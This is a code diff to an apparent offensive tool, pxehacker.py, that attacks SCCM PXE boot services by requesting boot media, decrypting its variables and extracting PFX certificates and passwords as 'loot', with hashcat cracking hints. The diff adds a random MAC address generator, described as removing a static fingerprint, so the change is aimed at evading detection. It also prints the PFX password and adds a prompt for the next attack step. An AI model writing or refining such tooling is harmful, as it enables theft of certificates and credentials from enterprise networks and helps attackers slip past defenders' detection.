@@ -19,6 +19,7 @@ Features:
 import argparse
 import binascii
 import os
+import random
 import struct
 import sys
 import xml.etree.ElementTree as ET
@@ -55,6 +56,7 @@ attack_parser.add_argument("socks_host", nargs="?", default=None, help="SOCKS5 p
 attack_parser.add_argument("socks_port", nargs="?", default=None, type=int, help="SOCKS5 proxy port (omit for direct UDP)")
 attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
 attack_parser.add_argument("-o", "--output", help="Output directory for loot files", type=str, default="./loot")
+attack_parser.add_argument("--mac", help="Source MAC address for the PXE boot request (random per run if omitted)", type=str, default=None)
 
 # Decrypt mode — decrypt a local .boot.var file with a key
 decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downloaded .boot.var file")
@@ -156,10 +158,20 @@ def print_hashcat_command(hashcat_hash, hashcat_mode):
     else:
         print("[!] No known hashcat mode for this encryption type")
 
+def generate_random_mac():
+    """Generate a random, locally-administered unicast MAC.
+    A fixed MAC on every PXE boot request is a static, tool-wide fingerprint.
+    """
+    first_byte = (random.randint(0, 255) & 0xFC) | 0x02  # locally administered, unicast
+    other_bytes = [random.randint(0, 255) for _ in range(5)]
+    return ":".join(f"{b:02x}" for b in [first_byte] + other_bytes)
+
+
 def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
     """Extract PFX cert and key info from decrypted media variables."""
     print("[*] Extracting loot from decrypted media variables...")
     sccm_client.extract_media_variables(decrypted_xml, output_dir)
+    print(f"[*] Next step: python3 pxehacker.py policies {output_dir}/variables.xml [--mp URL]")
 
 
 def main():
@@ -211,7 +223,7 @@ def main():
         print(f"[*] MP candidates: {mp_candidates}")
         print(f"[*] Site Code: {site_code}")
         print(f"[*] Media GUID: {media_guid}")
-        print(f"[*] PFX Password: {pfx_password}")
+        print(f"[*] PFX Password: {pfx_password!r}")
         if local_guids["x64"]:
             print(f"[*] x64UnknownMachineGUID (from variables.xml): {local_guids['x64']}")
 
@@ -380,12 +392,15 @@ def main():
             return socks.SOCKS5Client(args.socks_host, args.socks_port)
         return socks.DirectUDPClient()
 
+    client_mac = args.mac or generate_random_mac()
+    print(f"[*] Using client MAC: {client_mac}")
+
     # Request PXE boot metadata
     client = make_client()
     try:
         client.connect()
         sccm_client = sccm.SCCM(args.target, 4011, client)
-        (variables, bcd, cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")
+        (variables, bcd, cryptokey) = sccm_client.send_bootp_request(args.src_ip, client_mac)
     except Exception as e:
         print(f"[!] PXE boot request failed: {e}")
         sys.exit(1)
